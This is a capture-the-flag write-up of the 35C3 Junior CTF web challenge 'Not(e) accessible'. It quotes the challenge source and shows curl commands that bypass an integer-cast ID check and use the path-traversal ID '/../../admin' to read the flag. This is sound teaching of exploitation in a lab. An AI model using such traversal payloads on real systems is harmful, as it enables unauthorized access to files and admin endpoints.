# Not(e) accessible
Web
## Description:
> We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that's why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.
> 
> Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable...
## Solution:
The website offers a service where one can enter a note. 
After entering the requested note (e.g. "Test"), the response contains the following information:
```
Your note ID is 8156135140806036359
Your note PW is 0cbc6611f5540bd0809a388dc95a615b
Link to view note: http://35.207.132.47:90/view.php?id=8156135140806036359&pw=0cbc6611f5540bd0809a388dc95a615b
```
Some observations: 
* When entering the same text twice, the ID changes but the PW does not.
* Searching for the PW, it looks like it is the MD5 of the note.
* The website source code has the following comment: ``
The next step is obviously to try and download the source code, and indeed - such an archive exists.
After extracting it, we get:
```ruby
# File path: backend/app.rb:
require 'sinatra'
set :bind, '0.0.0.0'
get '/get/:id' do
	File.read("./notes/#{params['id']}.note")
end
get '/store/:id/:note' do 
	File.write("./notes/#{params['id']}.note", params['note'])
	puts "OK"
end 
get '/admin' do
	File.read("flag.txt")
end
```
```php
# File path: frontend/index.php
    Not(e) accessible
      Not(e) accessible
        Not(e) accessible :-(
        This is good service. It is not(e) accessible!
                Enter your text
              Submit note!
 1000) {
            die("ERROR! - Text too long");
        }
        if(!preg_match("/^[a-zA-Z]+$/", $note)) {
            die("ERROR! - Text does not match /^[a-zA-Z]+$/");
        }
        $id = random_int(PHP_INT_MIN, PHP_INT_MAX);
        $pw = md5($note);
        # Save password so that we can check it later
        file_put_contents("./pws/$id.pw", $pw); 
        file_get_contents($BACKEND . "store/" . $id . "/" . $note);
        echo '';
            echo "Your note ID is $id";
            echo "Your note PW is $pw";
            echo "Click here to view your note!";
        echo '';
    }
?>
        With love from @gehaxelt for the 35C3 Junior CTF and ESPR :-)
```
```php
# File path: frontend/view.php:
```
The backend catches the immediate attention due to the following logic:
```ruby
get '/admin' do
	File.read("flag.txt")
end
```
So, we need to find a way to either access `/admin` or directly access `flag.txt`.
Back to `view.php`:
```php
if(file_exists("./pws/" . (int) $id . ".pw")) {
    if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
        echo file_get_contents($BACKEND . "get/" . $id);
    }
    ...
}
```
The `file_get_contents` call looks like it is vulnerable to path traversal - if we get it to be `../admin` then we should get the flag. However, how to we bypass the checks above? Easy - with the help of the type casting! 
Since `$id` is cast to an integer, if we send a string which starts with a number, the PHP engine will ignore anything that comes after it. So we just need a valid ID-PW pair, and we send the ID as `/../../admin`. The first two checks should pass since they will only take into account the ID, and the third line will actually tread the ID as a folder.
```console
root@kali:/media/sf_CTFs/35c3ctf/Note_accessible# curl -s 'http://35.207.132.47:90/' -H 'Content-Type: application/x-www-form-urlencoded'  --data 'note=Test&submit=submit' | grep "Your note ID"
Your note ID is 140357144873505230Your note PW is 0cbc6611f5540bd0809a388dc95a615bClick here to view your note!    
root@kali:/media/sf_CTFs/35c3ctf/Note_accessible# curl -s 'http://35.207.132.47:90/view.php?pw=0cbc6611f5540bd0809a388dc95a615b&id=140357144873505230/../../admin'
35C3_M1Cr0_S3rvices_4R3_FUN!
```
The flag: 35C3_M1Cr0_S3rvices_4R3_FUN!